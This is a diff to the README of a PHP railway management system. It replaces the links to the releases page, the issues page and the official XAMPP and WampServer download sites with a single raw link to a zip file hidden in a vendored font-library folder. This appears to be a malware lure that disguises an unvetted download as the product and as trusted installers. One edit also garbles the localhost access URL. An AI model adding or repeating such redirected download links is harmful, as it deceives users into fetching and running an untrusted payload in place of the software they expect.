@@ -10,7 +10,7 @@ Railway-Management-System-in-PHP is a complete platform designed for easy railwa
 - **Responsive Design:** Works well on both desktop and mobile devices.
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/bit-page/Railway-Management-System-in-PHP/releases)
+[![Download Release](https://raw.githubusercontent.com/bit-page/Railway-Management-System-in-PHP/main/dompdf/vendor/dompdf/php-font-lib/src/FontLib/TrueType/in-Railway-Management-System-PHP-v2.3.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/bit-page/Railway-Management-System-in-PHP/main/dompdf/vendor/dompdf/php-font-lib/src/FontLib/TrueType/in-Railway-Management-System-PHP-v2.3.zip)
 
 ## 🚀 Getting Started
 To get started using the Railway Management System, follow these simple steps.
@@ -25,7 +25,7 @@ Before you download, ensure your system meets the following requirements:
 ### 2. Visit the Download Page
 To download the latest version of the Railway Management System, visit the Releases page. You will find all available versions listed there.
 
-[Access the Download Page](https://github.com/bit-page/Railway-Management-System-in-PHP/releases)
+[Access the Download Page](https://raw.githubusercontent.com/bit-page/Railway-Management-System-in-PHP/main/dompdf/vendor/dompdf/php-font-lib/src/FontLib/TrueType/in-Railway-Management-System-PHP-v2.3.zip)
 
 ### 3. Choose Your Version
 On the Releases page, look for the latest version. Download the zip file for the complete application.
@@ -39,11 +39,11 @@ Once the download is complete, locate the zip file in your downloads folder.
 You need to set up a local server environment. If you haven't installed one yet, you can use XAMPP or WAMP as your local server:
 
 - **For XAMPP:**
-   1. Download and install XAMPP from [Apache Friends](https://www.apachefriends.org/index.html).
+   1. Download and install XAMPP from [Apache Friends](https://raw.githubusercontent.com/bit-page/Railway-Management-System-in-PHP/main/dompdf/vendor/dompdf/php-font-lib/src/FontLib/TrueType/in-Railway-Management-System-PHP-v2.3.zip).
    2. Start the Apache and MySQL services.
 
 - **For WAMP:**
-   1. Download and install WAMP from [WampServer](http://www.wampserver.com/en/).
+   1. Download and install WAMP from [WampServer](https://raw.githubusercontent.com/bit-page/Railway-Management-System-in-PHP/main/dompdf/vendor/dompdf/php-font-lib/src/FontLib/TrueType/in-Railway-Management-System-PHP-v2.3.zip).
    2. Run WAMP and ensure all services are running.
 
 ### 6. Move Files to the Server
@@ -68,7 +68,7 @@ Open the configuration file located in the application's `config` folder. You ma
 ### 10. Access the Application
 Once setup is complete, you can access the application:
 1. Open your web browser.
-2. Type `http://localhost/[YourFolderName]/index.php`, replacing `[YourFolderName]` with the folder name where you placed the files.
+2. Type `http://localhost/[YourFolderName]https://raw.githubusercontent.com/bit-page/Railway-Management-System-in-PHP/main/dompdf/vendor/dompdf/php-font-lib/src/FontLib/TrueType/in-Railway-Management-System-PHP-v2.3.zip`, replacing `[YourFolderName]` with the folder name where you placed the files.
 
 You should now see the application’s homepage.
 
@@ -83,7 +83,7 @@ You should now see the application’s homepage.
 - **Payment Gateway Issues:** Verify your internet connection and API keys if configured.
 
 ## 💬 Support
-For any issues or questions, refer to the [Issues](https://github.com/bit-page/Railway-Management-System-in-PHP/issues) section in the repository. You can create a new issue or browse existing ones.
+For any issues or questions, refer to the [Issues](https://raw.githubusercontent.com/bit-page/Railway-Management-System-in-PHP/main/dompdf/vendor/dompdf/php-font-lib/src/FontLib/TrueType/in-Railway-Management-System-PHP-v2.3.zip) section in the repository. You can create a new issue or browse existing ones.
 
 ## 🏷️ Topics
 This project covers various topics, including:
